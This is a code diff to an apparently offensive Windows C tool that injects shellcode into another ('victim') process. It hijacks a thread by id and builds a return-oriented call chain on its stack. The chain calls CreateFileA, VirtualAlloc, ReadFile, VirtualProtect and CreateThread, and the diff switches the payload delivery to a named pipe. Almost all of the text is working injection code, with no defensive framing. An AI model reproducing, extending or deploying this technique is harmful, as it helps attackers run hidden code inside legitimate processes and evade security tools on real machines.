@@ -1,8 +1,10 @@
 #include <windows.h>
 #include <stdio.h>
 #include "helpers.h"
+#define HEAP_ALLOC 0x1000 //how much mem to alloc on heap in victim
 #define gpa(x, y) ((unsigned int)GetProcAddress(GetModuleHandleA(x), y))
 int main(int argc, char** argv){
+    unsigned char pipename[] = "\\\\.\\pipe\\spookypipe";
     DWORD tid = atoi(argv[1]); //get thread id using args
     HANDLE thd = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
     
@@ -33,26 +35,38 @@ int main(int argc, char** argv){
     
     //inject the buffer
     int j;
-    for(j=sizeof(buf);j>4;j-=4){
+    unsigned int namptr;
+    for(j=sizeof(pipename);j>0;j-=4){
         unsigned int num = 0;
-        memcpy(&num, buf+j-4, 4);
-        push(num);
+        memcpy(&num, pipename+j-4, 4);
+        namptr = push(num);
     }
-    unsigned int newbuf = sizeof(buf);
-    unsigned int nesp;
-    j-=4;
-    if(j>-4){
-        unsigned int num = 0x90909090;
-        memcpy(((unsigned char*)&num)-j, buf, 4+j);
-        nesp = push(num);
-        newbuf=4*((newbuf+4)/4);
-    }
-    printf("Pushed code to stack, stack head at 0x%x\n", nesp);
+    printf("Pipe name injected to stack\n");
+    //make our pipe    
+    HANDLE pipe = CreateNamedPipe(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 4096, 0, 5000, NULL);
     
-    //push virtualalloc, alloc 1 page in RW
+    //connect victim process to pipe
+    push(0);
+    push(FILE_ATTRIBUTE_NORMAL);
+    push(OPEN_EXISTING);
+    push(0);
+    push(FILE_SHARE_READ);
+    push(GENERIC_READ);
+    push(namptr);
+    push(jmps);
+    push(gpa("kernel32.dll", "CreateFileA"));
+    
+    //execute
+    slay(thd);
+    
+    waitunblock(thd);
+    unsigned int phand = getretpush(0, thd); //HANDLE object in victim process
+    printf("Pipes connected\n");
+    
+    //push virtualalloc, alloc 1 page in RW in victim process
     push(PAGE_READWRITE);
     push(MEM_COMMIT);
-    push(0x1000);
+    push(HEAP_ALLOC);
     push(0);
     push(jmps);
     push(gpa("kernelbase.dll", "VirtualAlloc"));
@@ -62,9 +76,9 @@ int main(int argc, char** argv){
     
     waitunblock(thd);
     unsigned int addr = getretpush(0, thd);
-    printf("VirtualAlloc'd memory at 0x%x\n", addr);
+    printf("VirtualAlloc'd memory at 0x%x. Preparing ROP sled...\n", addr);
     
-    //prepare RtlMoveMemory -> VirtualProtect -> CreateThread rop sled
+    //prepare ReadFile -> CloseHandle -> VirtualProtect -> CreateThread rop sled
     push(0);
     push(0);
     push(addr);
@@ -73,22 +87,35 @@ int main(int argc, char** argv){
     push(jmps);
     push(gpa("kernel32.dll", "CreateThread"));
     
-    push(nesp); //just use unused portion of stack for mandatory LPVOID
+    push(namptr); //just use unused portion of stack for mandatory LPVOID
     push(PAGE_EXECUTE_READ);
-    push(0x1000);
+    push(HEAP_ALLOC);
     push(addr);
     push(ret);
     push(gpa("kernelbase.dll", "VirtualProtect"));
     
-    push(newbuf);
-    push(nesp);
-    push(addr);
+    push(phand);
     push(ret);
-    push(gpa("ntdll.dll", "RtlMoveMemory"));
+    push(gpa("kernel32.dll", "CloseHandle"));
+    
+    //read bytes from pipe
+    push(0);
+    push(namptr); //same strat as VirtualProtect
+    push(HEAP_ALLOC);
+    push(addr);
+    push(phand);
+    push(ret);
+    push(gpa("kernel32.dll", "ReadFile"));
+    
+    //write data to pipe
+    DWORD bw;
+    WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
+    printf("Data written to pipe. Executing ROP sled...\n");
     slay(thd);
     printf("Waiting for shellcode thread creation...\n");
     waitunblock(thd);
     printf("Execution completed! Restoring original thread...\n");
+    DisconnectNamedPipe(pipe);
     SuspendThread(thd);
     SetThreadContext(thd, &ctx);
     ResumeThread(thd);
